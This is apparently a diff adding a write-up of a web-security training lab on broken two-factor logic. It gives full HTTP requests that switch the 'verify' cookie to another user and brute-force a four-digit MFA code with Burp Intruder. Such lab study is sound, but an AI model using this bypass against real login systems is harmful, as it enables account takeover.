@@ -1,0 +1,37 @@
+2FA broken logic
+
+Can be a bit finnicky because of the csrf token.
+Send the /login2 request to repeater, change it to carlos, ensure you get a 200 response.
+
+Request:
+GET /login2 HTTP/1.1
+Host: ac3b1fc91ed1a53581d337b900630090.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac3b1fc91ed1a53581d337b900630090.web-security-academy.net/login
+Connection: close
+Cookie: session=8kzFoWlMqkOOJwaihWYAR1nWM0xclZWM; verify=carlos
+Upgrade-Insecure-Requests: 1
+
+
+
+Send the 2FA page for that request to intruder and start the bruteforce:
+Request:
+POST /login2 HTTP/1.1
+Host: ac3b1fc91ed1a53581d337b900630090.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac3b1fc91ed1a53581d337b900630090.web-security-academy.net/login
+Connection: close
+Cookie: session=8kzFoWlMqkOOJwaihWYAR1nWM0xclZWM; verify=carlos
+Upgrade-Insecure-Requests: 1
+
+csrf=FUS0erPM0uegMDjidyteBXFxffVblUWf&mfa-code=§1234§
+
+To brute force the code, in the Payloads tab select Payload Type: Brute forcer and Use the character set: 0123456789, min and max length 4
+
+Once you get a 302 response, right click on that request and select "Show response in browser" and click on "My Account".
